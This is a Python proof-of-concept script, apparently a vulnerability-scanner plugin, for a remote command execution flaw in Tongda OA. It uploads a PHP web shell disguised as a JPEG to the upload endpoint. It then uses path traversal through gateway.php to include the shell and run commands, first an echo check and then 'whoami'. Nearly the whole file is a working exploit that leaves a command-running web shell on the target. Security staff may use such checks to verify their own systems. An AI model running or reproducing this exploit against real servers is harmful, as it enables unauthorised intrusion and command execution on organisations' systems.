#!/usr/bin/env python3

'''
name: 通达OA漏洞
description: 通达OA可执行任意命令漏洞
'''

import re
import urllib3
from app.lib.utils.common import get_capta
from app.lib.utils.request import request

class Tongda_Oa_Rce_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.headers1 = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0',
            "Content-Type": "multipart/form-data; boundary=---------------------------27723940316706158781839860668"
        }
        self.headers2 = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        self.capta = get_capta()

    def run(self):
        try:
            name_data = "-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"ATTACHMENT\"; filename=\"f.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n<?php\r\n$command=$_POST['f'];\r\n$wsh = new COM('WScript.shell');\r\n$exec = $wsh->exec(\"cmd /c \".$command);\r\n$stdout = $exec->StdOut();\r\n$stroutput = $stdout->ReadAll();\r\necho $stroutput;\r\n?>\n\r\n-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"P\"\r\n\r\n1\r\n-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"DEST_UID\"\r\n\r\n1222222\r\n-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"UPLOAD_MODE\"\r\n\r\n1\r\n-----------------------------27723940316706158781839860668--\r\n"
            name_result = request.post(self.url + '/ispirit/im/upload.php', headers = self.headers1, data = name_data)
            name = "".join(re.findall("2003_(.+?)\|", name_result.text))
            check_data = {"json": "{\"url\":\"../../../general/../attach/im/2003/%s.f.jpg\"}" % (name), "f": "echo %s" % (self.capta)}
            check_result = request.post(self.url + '/ispirit/interface/gateway.php', headers = self.headers2, data = check_data)
            if check_result.status_code == 200 and self.capta in check_result.text:
                print("存在通达OA可执行任意命令漏洞,执行whoami漏洞结果为:")
                cmd_data = {"json": "{\"url\":\"../../../general/../attach/im/2003/%s.f.jpg\"}" % (name), "f": "%s" % "whoami"}
                cmd_result = request.post(self.url + '/ispirit/interface/gateway.php', headers = self.headers2, data = cmd_data)
                print(cmd_result.text)
                return True
            else:
                print("不存在通达OA可执行任意命令漏洞")
                return False
        except Exception as e:
            print(e)
            print("不存在通达OA可执行任意命令漏洞")
            return False
        finally:
            pass

if __name__ == '__main__':
    tongda_oa = Tongda_Oa_Rce_BaseVerify('http://127.0.0.1')
    tongda_oa.run()

